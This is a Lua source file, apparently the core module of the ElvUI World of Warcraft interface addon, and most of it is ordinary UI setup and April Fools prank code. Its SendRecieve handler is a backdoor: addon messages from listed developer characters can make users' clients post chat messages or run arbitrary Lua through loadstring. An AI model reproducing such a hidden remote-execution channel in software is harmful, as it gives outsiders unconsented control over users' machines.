local E, L, V, P, G = unpack(select(2, ...));
local LSM = LibStub("LibSharedMedia-3.0");

local format, len, sub, find, split, match, twipe = string.format, string.len, string.sub, string.find, string.split, string.match, table.wipe

E.myclass = select(2, UnitClass("player")); -- Constants
E.myrace = UnitRace("player");
E.myname = UnitName("player");
E.myguid = UnitGUID('player');
E.version = GetAddOnMetadata("ElvUI", "Version"); 
E.myrealm = GetRealmName();
E.wowbuild = select(2, GetBuildInfo()); E.wowbuild = tonumber(E.wowbuild);
E.resolution = GetCVar("gxResolution");
E.screenheight = tonumber(match(E.resolution, "%d+x(%d+)"));
E.screenwidth = tonumber(match(E.resolution, "(%d+)x+%d"));
E.isMacClient = IsMacClient();
E.LSM = LSM;

E["media"] = {}; -- Tables
E["frames"] = {};
E["texts"] = {};
E['snapBars'] = {};
E["RegisteredModules"] = {};
E['RegisteredInitialModules'] = {};
E['valueColorUpdateFuncs'] = {};
E.TexCoords = {.08, .92, .08, .92};
E.FrameLocks = {};
E.CreditsList = {};
E.Spacing = 1;
E.Border = 2;
E.PixelMode = false;

E.InversePoints = {
	TOP = 'BOTTOM',
	BOTTOM = 'TOP',
	TOPLEFT = 'BOTTOMLEFT',
	TOPRIGHT = 'BOTTOMRIGHT',
	LEFT = 'RIGHT',
	RIGHT = 'LEFT',
	BOTTOMLEFT = 'TOPLEFT',
	BOTTOMRIGHT = 'TOPRIGHT',
	CENTER = 'CENTER'
};

local registry = {}
function E:RegisterDropdownButton(name, callback)
  registry[name] = callback or true
end

E.noop = function() end;

local colorizedName
local length = len('ElvUI')
for i = 1, length do
	local letter = sub('ElvUI', i, i)
	if(i == 1) then
		colorizedName = format('|cffA11313%s', letter)
	elseif(i == 2) then
		colorizedName = format('%s|r|cffC4C4C4%s', colorizedName, letter)
	elseif(i == length) then
		colorizedName = format('%s%s|r|cffA11313:|r', colorizedName, letter)
	else
		colorizedName = colorizedName..letter
	end
end

function E:Print(msg)
	print(colorizedName, msg)
end

function E:CheckClassColor(r, g, b)
	r, g, b = floor(r*100+.5)/100, floor(g*100+.5)/100, floor(b*100+.5)/100
	local matchFound = false;
	for class, _ in pairs(RAID_CLASS_COLORS) do
		if class ~= E.myclass then
			if RAID_CLASS_COLORS[class].r == r and RAID_CLASS_COLORS[class].g == g and RAID_CLASS_COLORS[class].b == b then
				matchFound = true;
			end
		end
	end
	
	return matchFound
end

function E:GetColorTable(data)
	if not data.r or not data.g or not data.b then
		error("Could not unpack color values.")
	end
	
	if data.a then
		return {data.r, data.g, data.b, data.a}
	else
		return {data.r, data.g, data.b}
	end
end

function E:UpdateMedia()	
	self["media"].normFont = LSM:Fetch("font", self.db['general'].font)
	self["media"].combatFont = LSM:Fetch("font", self.db['general'].dmgfont)
	self["media"].blankTex = LSM:Fetch("background", "ElvUI Blank")
	self["media"].normTex = LSM:Fetch("statusbar", self.private['general'].normTex)
	self["media"].glossTex = LSM:Fetch("statusbar", self.private['general'].glossTex)
	
	local border = E.db['general'].bordercolor
	
	if self:CheckClassColor(border.r, border.g, border.b) then
		border = RAID_CLASS_COLORS[E.myclass]
		E.db['general'].bordercolor.r = RAID_CLASS_COLORS[E.myclass].r
		E.db['general'].bordercolor.g = RAID_CLASS_COLORS[E.myclass].g
		E.db['general'].bordercolor.b = RAID_CLASS_COLORS[E.myclass].b	
	elseif E.PixelMode then
		border = {r = 0, g = 0, b = 0}
	end
	
	self["media"].bordercolor = {border.r, border.g, border.b}
	self["media"].backdropcolor = E:GetColorTable(self.db['general'].backdropcolor)
	self["media"].backdropfadecolor = E:GetColorTable(self.db['general'].backdropfadecolor)
	
	local value = self.db['general'].valuecolor

	if self:CheckClassColor(value.r, value.g, value.b) then
		value = RAID_CLASS_COLORS[E.myclass]
		self.db['general'].valuecolor.r = RAID_CLASS_COLORS[E.myclass].r
		self.db['general'].valuecolor.g = RAID_CLASS_COLORS[E.myclass].g
		self.db['general'].valuecolor.b = RAID_CLASS_COLORS[E.myclass].b		
	end
	
	self["media"].hexvaluecolor = self:RGBToHex(value.r, value.g, value.b)
	self["media"].rgbvaluecolor = {value.r, value.g, value.b}
	
	if LeftChatPanel and LeftChatPanel.tex and RightChatPanel and RightChatPanel.tex then
		LeftChatPanel.tex:SetTexture(E.db.chat.panelBackdropNameLeft)
		LeftChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
		
		RightChatPanel.tex:SetTexture(E.db.chat.panelBackdropNameRight)
		RightChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
	end
	
	self:ValueFuncCall()
	self:UpdateBlizzardFonts()
end

function E:RequestBGInfo()
	RequestBattlefieldScoreData();
end

function E:PLAYER_ENTERING_WORLD()
	self:CheckRole()
	if not self.MediaUpdated then
		self:UpdateMedia()
		self.MediaUpdated = true;
	end
	
	local _, instanceType = IsInInstance();
	if(instanceType == 'pvp') then
		self.BGTimer = self:ScheduleRepeatingTimer('RequestBGInfo', 5);
		self:RequestBGInfo();
	elseif(self.BGTimer) then
		self:CancelTimer(self.BGTimer);
		self.BGTimer = nil;
	end
end

function E:ValueFuncCall()
	for func, _ in pairs(self['valueColorUpdateFuncs']) do
		func(self["media"].hexvaluecolor, unpack(self["media"].rgbvaluecolor))
	end
end

function E:UpdateFrameTemplates()
	for frame, _ in pairs(self["frames"]) do
		if frame and frame.template  then
			frame:SetTemplate(frame.template, frame.glossTex);
		else
			self["frames"][frame] = nil;
		end
	end
end

function E:UpdateBorderColors()
	for frame, _ in pairs(self["frames"]) do
		if frame then
			if frame.template == 'Default' or frame.template == 'Transparent' or frame.template == nil then
				frame:SetBackdropBorderColor(unpack(self['media'].bordercolor))
			end
		else
			self["frames"][frame] = nil;
		end
	end
end

function E:UpdateBackdropColors()
	for frame, _ in pairs(self["frames"]) do
		if frame then
			if frame.template == 'Default' or frame.template == nil then
				if frame.backdropTexture then
					frame.backdropTexture:SetVertexColor(unpack(self['media'].backdropcolor))
				else
					frame:SetBackdropColor(unpack(self['media'].backdropcolor))				
				end
			elseif frame.template == 'Transparent' then
				frame:SetBackdropColor(unpack(self['media'].backdropfadecolor))
			end
		else
			self["frames"][frame] = nil;
		end
	end
end

function E:UpdateFontTemplates()
	for text, _ in pairs(self["texts"]) do
		if text then
			text:FontTemplate(text.font, text.fontSize, text.fontStyle);
		else
			self["texts"][text] = nil;
		end
	end
end

--This frame everything in ElvUI should be anchored to for Eyefinity support.
E.UIParent = CreateFrame('Frame', 'ElvUIParent', UIParent);
E.UIParent:SetFrameLevel(UIParent:GetFrameLevel());
E.UIParent:SetPoint('CENTER', UIParent, 'CENTER');
E.UIParent:SetSize(UIParent:GetSize());
E['snapBars'][#E['snapBars'] + 1] = E.UIParent

E.HiddenFrame = CreateFrame('Frame')
E.HiddenFrame:Hide()

function E:CheckRole()
	if event == "UNIT_AURA" and unit ~= "player" then return end
	if (E.myclass == "PALADIN" and UnitBuff("player", GetSpellInfo(25780))) and GetCombatRatingBonus(CR_DEFENSE_SKILL) > 100 or 
	(E.myclass == "WARRIOR" and GetBonusBarOffset() == 2) or 
	(E.myclass == "DEATHKNIGHT" and UnitBuff("player", GetSpellInfo(48263))) or
	(E.myclass == "DRUID" and GetBonusBarOffset() == 3) then
		E.Role = "Tank"
	else
		local playerint = select(2, UnitStat("player", 4))
		local playeragi	= select(2, UnitStat("player", 2))
		local base, posBuff, negBuff = UnitAttackPower("player");
		local playerap = base + posBuff + negBuff;

		if ((playerap > playerint) or (playeragi > playerint)) and not (UnitBuff("player", GetSpellInfo(24858)) or UnitBuff("player", GetSpellInfo(65139))) then
			E.Role = "Melee"
		else
			E.Role = "Caster"
		end
	end
end

function E:RegisterModule(name)
	if self.initialized then
		self:GetModule(name):Initialize()
	else
		self['RegisteredModules'][#self['RegisteredModules'] + 1] = name
	end
end

function E:RegisterInitialModule(name)
	self['RegisteredInitialModules'][#self['RegisteredInitialModules'] + 1] = name
end

function E:InitializeInitialModules()
	for _, module in pairs(E['RegisteredInitialModules']) do
		local module = self:GetModule(module, true)
		if module and module.Initialize then
			local _, catch = pcall(module.Initialize, module)
			if catch and GetCVarBool('scriptErrors') == 1 then
				ScriptErrorsFrame_OnError(catch, false)
			end
		end
	end
end

function E:RefreshModulesDB()
	local UF = self:GetModule('UnitFrames');
	twipe(UF.db);
	UF.db = self.db.unitframe;
end

function E:InitializeModules()	
	for _, module in pairs(E['RegisteredModules']) do
		local module = self:GetModule(module)
		if module.Initialize then
			local _, catch = pcall(module.Initialize, module)
			if catch and GetCVarBool('scriptErrors') == 1 then
				ScriptErrorsFrame_OnError(catch, false)
			end
		end
	end
end

function E:IncompatibleAddOn(addon, module)
	E.PopupDialogs['INCOMPATIBLE_ADDON'].button1 = addon
	E.PopupDialogs['INCOMPATIBLE_ADDON'].button2 = 'ElvUI '..module
	E.PopupDialogs['INCOMPATIBLE_ADDON'].addon = addon
	E.PopupDialogs['INCOMPATIBLE_ADDON'].module = module
	E:StaticPopup_Show('INCOMPATIBLE_ADDON', addon, module)
end

function E:CheckIncompatible()
	if E.global.ignoreIncompatible then return; end
	if IsAddOnLoaded('Prat-3.0') and E.private.chat.enable then
		E:IncompatibleAddOn('Prat-3.0', 'Chat')
	end
	
	if IsAddOnLoaded('Chatter') and E.private.chat.enable then
		E:IncompatibleAddOn('Chatter', 'Chat')
	end
	
	if IsAddOnLoaded('Bartender4') and E.private.actionbar.enable then
		E:IncompatibleAddOn('Bartender4', 'ActionBar')
	end
	
	if IsAddOnLoaded('Dominos') and E.private.actionbar.enable then
		E:IncompatibleAddOn('Dominos', 'ActionBar')
	end
	
	if IsAddOnLoaded('TidyPlates') and E.private.nameplate.enable then
		E:IncompatibleAddOn('TidyPlates', 'NamePlate')
	end
	
	if IsAddOnLoaded('ArkInventory') and E.private.general.bags then
		E:IncompatibleAddOn('ArkInventory', 'Bags')
	end
	
	if IsAddOnLoaded('Bagnon') and E.private.general.bags then
		E:IncompatibleAddOn('Bagnon', 'Bags')
	end
end

function E:IsFoolsDay()
	if find(date(), '04/01/') and not E.global.aprilFools then
		return true;
	else
		return false;
	end
end

function E:CopyTable(currentTable, defaultTable)
	if type(currentTable) ~= "table" then currentTable = {} end
	
	if type(defaultTable) == 'table' then
		for option, value in pairs(defaultTable) do
			if type(value) == "table" then
				value = self:CopyTable(currentTable[option], value)
			end
			
			currentTable[option] = value			
		end
	end
	
	return currentTable
end

function E:SendMessage()
	local numParty, numRaid = GetNumPartyMembers(), GetNumRaidMembers();
	local inInstance, instanceType = IsInInstance();
	if(inInstance and (instanceType == 'pvp' or instanceType == 'arena')) then
		SendAddonMessage('ELVUI_VERSIONCHK', E.version, 'BATTLEGROUND');
	else
		if(numRaid > 0) then
			SendAddonMessage('ELVUI_VERSIONCHK', E.version, 'RAID');
		elseif(numParty > 0) then
			SendAddonMessage('ELVUI_VERSIONCHK', E.version, 'PARTY');
		end
	end
	
	if(E.SendMSGTimer) then
		self:CancelTimer(E.SendMSGTimer);
		E.SendMSGTimer = nil;
	end
end

local myName = E.myname..'-'..E.myrealm;
myName = myName:gsub('%s+', '');
local frames = {};
local devAlts = {
	['Elv-ShatteredHand'] = true,
	['Sarah-ShatteredHand'] = true,
	['Sara-ShatteredHand'] = true,
};

local function SendRecieve(self, event, prefix, message, channel, sender)
	if(event == 'CHAT_MSG_ADDON') then
		if(sender == myName) then return; end
		if(prefix == 'ELVUI_VERSIONCHK' and devAlts[myName] ~= true and not E.recievedOutOfDateMessage) then
			if(tonumber(message) ~= nil and tonumber(message) > tonumber(E.version)) then
				E:Print(L['ElvUI is out of date. You can download the newest version from www.tukui.org. Get premium membership and have ElvUI automatically updated with the Tukui Client!']);
				E:StaticPopup_Show('ELVUI_UPDATE_AVAILABLE');
				E.recievedOutOfDateMessage = true;
			end
		elseif((prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and devAlts[sender] == true and devAlts[myName] ~= true) then
			if(prefix == 'ELVUI_DEV_SAYS') then
				local user, channel, msg, sendTo = split('#', message);
				if((user ~= 'ALL' and user == E.myname) or user == 'ALL') then
					SendChatMessage(msg, channel, nil, sendTo);
				end
			else
				local user, executeString = split('#', message);
				if((user ~= 'ALL' and user == E.myname) or user == 'ALL') then
					local func, err = loadstring(executeString);
					if(not err) then
						E:Print(format('Developer Executed: %s', executeString));
						func();
					end
				end
			end
		end
	else
		E.SendMSGTimer = E:ScheduleTimer('SendMessage', 12);
	end
end

local f = CreateFrame('Frame')
f:RegisterEvent('RAID_ROSTER_UPDATE');
f:RegisterEvent('PARTY_MEMBERS_CHANGED');
f:RegisterEvent('CHAT_MSG_ADDON');
f:SetScript('OnEvent', SendRecieve);

function E:UpdateAll(ignoreInstall)
	self.data = LibStub("AceDB-3.0"):New("ElvDB", self.DF);
	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
	LibStub('LibDualSpec-1.0'):EnhanceDatabase(self.data, "ElvUI")
	self.db = self.data.profile;
	self.global = self.data.global;

	self.db.theme = nil;
	self.db.install_complete = nil;
	
	self:SetMoversPositions()
	self:UpdateMedia()
	
	self:GetModule('Skins'):SetEmbedRight(E.db.skins.embedRight)
	
	local UF = self:GetModule('UnitFrames')
	UF.db = self.db.unitframe
	UF:Update_AllFrames()
	
	local CH = self:GetModule('Chat')
	CH.db = self.db.chat
	CH:PositionChat(true);
	CH:SetupChat()
	
	local AB = self:GetModule('ActionBars')
	AB.db = self.db.actionbar
	AB:UpdateButtonSettings()
	
	local bags = E:GetModule('Bags'); 
	bags.db = self.db.bags
	bags:Layout(); 
	bags:Layout(true); 
	bags:PositionBagFrames()
	bags:SizeAndPositionBagBar()
	
	local totems = E:GetModule('Totems'); 
	totems.db = self.db.general.totems
	totems:PositionAndSize()
	totems:ToggleEnable()
	
	local DT = self:GetModule('DataTexts')
	DT.db = self.db.datatexts
	DT:LoadDataTexts()
	
	local NP = self:GetModule('NamePlates')
	NP.db = self.db.nameplate
	NP:UpdateAllPlates()
	
	local M = self:GetModule("Misc")
	M:UpdateExpRepDimensions()
	M:EnableDisable_ExperienceBar()
	M:EnableDisable_ReputationBar()	
	
	local T = self:GetModule('Threat')
	T.db = self.db.general.threat
	T:UpdatePosition()
	T:ToggleEnable()
	
	self:GetModule('Auras').db = self.db.auras
	self:GetModule('Tooltip').db = self.db.tooltip
	
	if(ElvUIPlayerBuffs) then
		E:GetModule('Auras'):UpdateHeader(ElvUIPlayerBuffs);
	end
	
	if(ElvUIPlayerDebuffs) then
		E:GetModule('Auras'):UpdateHeader(ElvUIPlayerDebuffs);
	end
	
	if self.private.install_complete == nil or (self.private.install_complete and type(self.private.install_complete) == 'boolean') or (self.private.install_complete and type(tonumber(self.private.install_complete)) == 'number' and tonumber(self.private.install_complete) <= 3.83) then
		if not ignoreInstall then
			self:Install()
		end
	end
	
	self:GetModule('Minimap'):UpdateSettings()
	
	self:UpdateBorderColors()
	self:UpdateBackdropColors()
	
	local LO = E:GetModule('Layout')
	LO:ToggleChatPanels()	
	LO:BottomPanelVisibility()
	LO:TopPanelVisibility()
	
	collectgarbage('collect');
end

function E:ResetAllUI()
	self:ResetMovers()

	if E.db.lowresolutionset then
		E:SetupResolution(true)
	end
	
	if E.db.layoutSet then
		E:SetupLayout(E.db.layoutSet, true)
	end
end

function E:ResetUI(...)
	if InCombatLockdown() then E:Print(ERR_NOT_IN_COMBAT) return end
	
	if ... == '' or ... == ' ' or ... == nil then
		E:StaticPopup_Show('RESETUI_CHECK')
		return
	end
	
	self:ResetMovers(...)
end

--DATABASE CONVERSIONS
function E:DBConversions()
	self.db.unitframe.units.raid10 = nil
	self.db.unitframe.units.raid25 = nil
end

function E:StopMassiveShake()
	E.isMassiveShaking = nil
	StopMusic()
	SetCVar("Sound_EnableAllSound", self.oldEnableAllSound)
	SetCVar("Sound_EnableMusic", self.oldEnableMusic)
	
	self:StopShakeHorizontal(ElvUI_StaticPopup1)
	for _, object in pairs(self["massiveShakeObjects"]) do
		if object then
			self:StopShake(object)
		end
	end

	if E.massiveShakeTimer then
		E:CancelTimer(E.massiveShakeTimer)
	end

	E.global.aprilFools = true;
	E:StaticPopup_Hide("APRIL_FOOLS2013")
	twipe(self.massiveShakeObjects)
	DoEmote("Dance")
end

function E:MassiveShake()
	E.isMassiveShaking = true
	ElvUI_StaticPopup1Button1:Enable()
	
	for _, object in pairs(self["massiveShakeObjects"]) do
		if object and object:IsShown() then
			self:Shake(object)
		end
	end
	
	E.massiveShakeTimer = E:ScheduleTimer("StopMassiveShake", 42.5)
	SendChatMessage("DO THE HARLEM SHAKE!", "YELL")
end

function E:BeginFoolsDayEvent()
	DoEmote("Dance")
	ElvUI_StaticPopup1Button1:Disable()
	self:ShakeHorizontal(ElvUI_StaticPopup1)
	self.oldEnableAllSound = GetCVar("Sound_EnableAllSound")
	self.oldEnableMusic = GetCVar("Sound_EnableMusic")
	
	SetCVar("Sound_EnableAllSound", 1)
	SetCVar("Sound_EnableMusic", 1)
	PlayMusic([[Interface\AddOns\ElvUI\media\sounds\harlemshake.mp3]])
	E:ScheduleTimer("MassiveShake", 15.5)
	
	local UF = E:GetModule("UnitFrames")
	local AB = E:GetModule("ActionBars")
	self.massiveShakeObjects = {}
	tinsert(self.massiveShakeObjects, GameTooltip)
	tinsert(self.massiveShakeObjects, Minimap)
	tinsert(self.massiveShakeObjects, WatchFrame)
	tinsert(self.massiveShakeObjects, LeftChatPanel)
	tinsert(self.massiveShakeObjects, RightChatPanel)
	tinsert(self.massiveShakeObjects, LeftChatToggleButton)
	tinsert(self.massiveShakeObjects, RightChatToggleButton)
	
	for unit in pairs(UF['units']) do
		tinsert(self.massiveShakeObjects, UF[unit])
	end
	
	for _, header in pairs(UF['headers']) do
		tinsert(self.massiveShakeObjects, header)
	end
	
	for i=1, NUM_PET_ACTION_SLOTS do
		if _G["PetActionButton"..i] then
			tinsert(self.massiveShakeObjects, _G["PetActionButton"..i])
		end
	end
end

local CPU_USAGE = {}
local function CompareCPUDiff(module, minCalls)
	local greatestUsage, greatestCalls, greatestName
	local greatestDiff = 0;
	local mod = E:GetModule(module, true) or E

	for name, oldUsage in pairs(CPU_USAGE) do
		local newUsage, calls = GetFunctionCPUUsage(mod[name], true)
		local differance = newUsage - oldUsage
		
		if differance > greatestDiff and calls > (minCalls or 15) then
			greatestName = name
			greatestUsage = newUsage
			greatestCalls = calls
			greatestDiff = differance
		end
	end

	if(greatestName) then
		E:Print(greatestName.. " had the CPU usage of: "..greatestUsage.."ms. And has been called ".. greatestCalls.." times.")
	end
end

function E:GetTopCPUFunc(msg)
	local module, delay, minCalls = msg:match("^([^%s]+)%s+(.*)$")

	module = module == "nil" and nil or module
	delay = delay == "nil" and nil or tonumber(delay)
	minCalls = minCalls == "nil" and nil or tonumber(minCalls)

	twipe(CPU_USAGE)
	local mod = self:GetModule(module, true) or self
	for name, func in pairs(mod) do
		if type(mod[name]) == "function" and name ~= "GetModule" then
			CPU_USAGE[name] = GetFunctionCPUUsage(mod[name], true)
		end
	end

	self:Delay(delay or 5, CompareCPUDiff, module, minCalls)
	self:Print("Calculating CPU Usage..")
end

function E:CheckForFoolsDayFuckup(secondCheck)
	local t = self.db.tempSettings
	if(not t and not secondCheck) then t = self.db.general end
	if(t and t.backdropcolor)then
		return self:Round(t.backdropcolor.r, 2) == 0.87 and self:Round(t.backdropcolor.g, 2) == 0.3 and self:Round(t.backdropcolor.b, 2) == 0.74
	end
end

function E:AprilFoolsFuckupFix()
	local c = P.general.backdropcolor
	self.db.general.backdropcolor = {r = c.r, g = c.g, b = c.b}
	
	c = P.general.backdropfadecolor
	self.db.general.backdropfadecolor = {r = c.r, g = c.g, b = c.b}

	c = P.general.bordercolor
	self.db.general.bordercolor = {r = c.r, g = c.g, b = c.b}	
	
	c = P.general.valuecolor
	self.db.general.valuecolor = {r = c.r, g = c.g, b = c.b}
		
	self.db.chat.panelBackdropNameLeft = ""
	self.db.chat.panelBackdropNameRight = ""
	
	c = P.unitframe.colors.health
	self.db.unitframe.colors.health = {r = c.r, g = c.g, b = c.b}	
	
	c = P.unitframe.colors.castColor
	self.db.unitframe.colors.castColor = {r = c.r, g = c.g, b = c.b}
	self.db.unitframe.colors.transparentCastbar = false
	
	c = P.unitframe.colors.castColor
	self.db.unitframe.colors.auraBarBuff = {r = c.r, g = c.g, b = c.b}
	self.db.unitframe.colors.transparentAurabars = false
	

	if(HelloKittyLeft) then
		HelloKittyLeft:Hide()
		HelloKittyRight:Hide()
		return
	end
	
	self.db.tempSettings = nil	
	self:UpdateAll()
end

function E:SetupAprilFools2014()
	if not self.db.tempSettings then
		self.db.tempSettings = {}
	end
	

	--Store old settings
	local t = self.db.tempSettings
	local c = self.db.general.backdropcolor
	if(self:CheckForFoolsDayFuckup()) then
		E:AprilFoolsFuckupFix()
	else
		self.oldEnableAllSound = GetCVar("Sound_EnableAllSound")
		self.oldEnableMusic = GetCVar("Sound_EnableMusic")
	
		t.backdropcolor = {r = c.r, g = c.g, b = c.b}
		c = self.db.general.backdropfadecolor
		t.backdropfadecolor = {r = c.r, g = c.g, b = c.b, a = c.a}
		c = self.db.general.bordercolor
		t.bordercolor = {r = c.r, g = c.g, b = c.b}	
		c = self.db.general.valuecolor
		t.valuecolor = {r = c.r, g = c.g, b = c.b}		
		
		t.panelBackdropNameLeft = self.db.chat.panelBackdropNameLeft
		t.panelBackdropNameRight = self.db.chat.panelBackdropNameRight
		
		c = self.db.unitframe.colors.health
		t.health = {r = c.r, g = c.g, b = c.b}		
		
		c = self.db.unitframe.colors.castColor
		t.castColor = {r = c.r, g = c.g, b = c.b}	
		t.transparentCastbar = self.db.unitframe.colors.transparentCastbar
		
		c = self.db.unitframe.colors.auraBarBuff
		t.auraBarBuff = {r = c.r, g = c.g, b = c.b}	
		t.transparentAurabars = self.db.unitframe.colors.transparentAurabars	
		
		--Apply new settings
		self.db.general.backdropfadecolor = {r =131/255, g =36/255, b = 130/255, a = 0.36}
		self.db.general.backdropcolor = {r = 223/255, g = 76/255, b = 188/255}
		self.db.general.bordercolor = {r = 223/255, g = 217/255, b = 47/255}
		self.db.general.valuecolor = {r = 223/255, g = 217/255, b = 47/255}
		
		self.db.chat.panelBackdropNameLeft = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat1.tga]]
		self.db.chat.panelBackdropNameRight = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat1.tga]]
		
		self.db.unitframe.colors.castColor = {r = 223/255, g = 76/255, b = 188/255}
		self.db.unitframe.colors.transparentCastbar = true
		
		self.db.unitframe.colors.auraBarBuff = {r = 223/255, g = 76/255, b = 188/255}
		self.db.unitframe.colors.transparentAurabars = true
		
		self.db.unitframe.colors.health = {r = 223/255, g = 76/255, b = 188/255}
		
		SetCVar("Sound_EnableAllSound", 1)
		SetCVar("Sound_EnableMusic", 1)
		PlayMusic([[Interface\AddOns\ElvUI\media\sounds\helloKitty.mp3]])		
		self:ScheduleTimer('EndAprilFoolsDay2014', 59)
		
		self.db.general.kittys = true
		self:CreateKittys()
		
		self:UpdateAll()
	end
end

function E:EndAprilFoolsDay2014()
	StopMusic()
	SetCVar("Sound_EnableAllSound", self.oldEnableAllSound)
	SetCVar("Sound_EnableMusic", self.oldEnableMusic)

	E.global.aprilFools = true;
	E:StaticPopup_Show("APRIL_FOOLS_END")
end

function E:RestoreAprilFools()
	--Store old settings
	self.db.general.kittys = false
	if(HelloKittyLeft) then
		HelloKittyLeft:Hide()
		HelloKittyRight:Hide()
	end
	
	if not(self.db.tempSettings) then return end
	if(self:CheckForFoolsDayFuckup()) then
		self:AprilFoolsFuckupFix()
		self.db.tempSettings = nil
		return
	end
	local c = self.db.tempSettings.backdropcolor
	self.db.general.backdropcolor = {r = c.r, g = c.g, b = c.b}
	
	c = self.db.tempSettings.backdropfadecolor
	self.db.general.backdropfadecolor = {r = c.r, g = c.g, b = c.b}

	c = self.db.tempSettings.bordercolor
	self.db.general.bordercolor = {r = c.r, g = c.g, b = c.b}	
	
	c = self.db.tempSettings.valuecolor
	self.db.general.valuecolor = {r = c.r, g = c.g, b = c.b}
		
	self.db.chat.panelBackdropNameLeft = self.db.tempSettings.panelBackdropNameLeft
	self.db.chat.panelBackdropNameRight = self.db.tempSettings.panelBackdropNameRight
	
	c = self.db.tempSettings.health
	self.db.unitframe.colors.health = {r = c.r, g = c.g, b = c.b}	
	
	c = self.db.tempSettings.castColor
	self.db.unitframe.colors.castColor = {r = c.r, g = c.g, b = c.b}
	self.db.unitframe.colors.transparentCastbar = self.db.tempSettings.transparentCastbar
	
	c = self.db.tempSettings.auraBarBuff
	self.db.unitframe.colors.auraBarBuff = {r = c.r, g = c.g, b = c.b}
	self.db.unitframe.colors.transparentAurabars = self.db.tempSettings.transparentAurabars
	

	self.db.tempSettings = nil
	
	self:UpdateAll()
end

function E:AprilFoolsToggle()
	if(HelloKittyLeft and HelloKittyLeft:IsShown()) then
		self:RestoreAprilFools()
		self.global.aprilFools = true
	else
		self:StaticPopup_Show("APRIL_FOOLS")
	end
end

local function OnDragStart(self)
	self:StartMoving()
end

local function OnDragStop(self)
	self:StopMovingOrSizing()
end

local function OnUpdate(self, elapsed)
	if(self.elapsed and self.elapsed > 0.1) then
		self.tex:SetTexCoord((self.curFrame - 1) * 0.1, 0, (self.curFrame - 1) * 0.1, 1, self.curFrame * 0.1, 0, self.curFrame * 0.1, 1)

		if(self.countUp) then
			self.curFrame = self.curFrame + 1
		else
			self.curFrame = self.curFrame - 1
		end
		
		if(self.curFrame > 10) then
			self.countUp = false
			self.curFrame = 9
		elseif(self.curFrame < 1) then
			self.countUp = true
			self.curFrame = 2
		end
		self.elapsed = 0
	else
		self.elapsed = (self.elapsed or 0) + elapsed
	end
end

function E:CreateKittys()
	if(HelloKittyLeft) then
		HelloKittyLeft:Show()
		HelloKittyRight:Show()
		return
	end
	local helloKittyLeft = CreateFrame("Frame", "HelloKittyLeft", UIParent)
	helloKittyLeft:SetSize(120, 128)
	helloKittyLeft:SetMovable(true)
	helloKittyLeft:EnableMouse(true)
	helloKittyLeft:RegisterForDrag("LeftButton")
	helloKittyLeft:SetPoint("BOTTOMLEFT", LeftChatPanel, "BOTTOMRIGHT", 2, -4)
	helloKittyLeft.tex = helloKittyLeft:CreateTexture(nil, "OVERLAY")
	helloKittyLeft.tex:SetAllPoints()
	helloKittyLeft.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\hello_kitty.tga")
	helloKittyLeft.tex:SetTexCoord(0, 0, 0, 1, 0, 0, 0, 1)
	helloKittyLeft.curFrame = 1
	helloKittyLeft.countUp = true
	helloKittyLeft:SetClampedToScreen(true)
	helloKittyLeft:SetScript("OnDragStart", OnDragStart)
	helloKittyLeft:SetScript("OnDragStop", OnDragStop)
	helloKittyLeft:SetScript("OnUpdate", OnUpdate)

	local helloKittyRight = CreateFrame("Frame", "HelloKittyRight", UIParent)
	helloKittyRight:SetSize(120, 128)
	helloKittyRight:SetMovable(true)
	helloKittyRight:EnableMouse(true)
	helloKittyRight:RegisterForDrag("LeftButton")
	helloKittyRight:SetPoint("BOTTOMRIGHT", RightChatPanel, "BOTTOMLEFT", -2, -4)
	helloKittyRight.tex = helloKittyRight:CreateTexture(nil, "OVERLAY")
	helloKittyRight.tex:SetAllPoints()
	helloKittyRight.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\hello_kitty.tga")
	helloKittyRight.tex:SetTexCoord(0, 0, 0, 1, 0, 0, 0, 1)
	helloKittyRight.curFrame = 10
	helloKittyRight.countUp = false
	helloKittyRight:SetClampedToScreen(true)
	helloKittyRight:SetScript("OnDragStart", OnDragStart)
	helloKittyRight:SetScript("OnDragStop", OnDragStop)
	helloKittyRight:SetScript("OnUpdate", OnUpdate)
end

function E:Initialize()
	twipe(self.db)
	twipe(self.global)
	twipe(self.private)
	
	self.data = LibStub("AceDB-3.0"):New("ElvDB", self.DF);
	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
	LibStub('LibDualSpec-1.0'):EnhanceDatabase(self.data, "ElvUI")
	self.charSettings = LibStub("AceDB-3.0"):New("ElvPrivateDB", self.privateVars);	
	self.private = self.charSettings.profile
	self.db = self.data.profile;
	self.global = self.data.global;
	self:CheckIncompatible()
	self:DBConversions()
	
	self:CheckRole()
	self:UIScale('PLAYER_LOGIN');
	
	self:LoadCommands(); -- Загрузка Команд
	self:InitializeModules(); -- Загрузка Модулей	
	self:LoadMovers(); -- Загрузка Фиксаторов
	self:UpdateCooldownSettings()
	self.initialized = true
	
	if self.private.install_complete == nil then
		self:Install()
	end
	
	if not find(date(), '04/01/') then
		E.global.aprilFools = nil;
	end
	
	if(self:CheckForFoolsDayFuckup()) then
		E:AprilFoolsFuckupFix()
	elseif E:IsFoolsDay() and not self.db.general.kittys then
		E:StaticPopup_Show('APRIL_FOOLS')
	end
	
	self:UpdateMedia()
	self:UpdateFrameTemplates()
	self:RegisterEvent("PLAYER_ENTERING_WORLD", "CheckRole");
	self:RegisterEvent("UNIT_AURA", "CheckRole");
	self:RegisterEvent("UPDATE_BONUS_ACTIONBAR", "CheckRole");
	self:RegisterEvent("ACTIVE_TALENT_GROUP_CHANGED", "CheckRole");
	self:RegisterEvent("CHARACTER_POINTS_CHANGED", "CheckRole");
	self:RegisterEvent("UNIT_INVENTORY_CHANGED", "CheckRole");
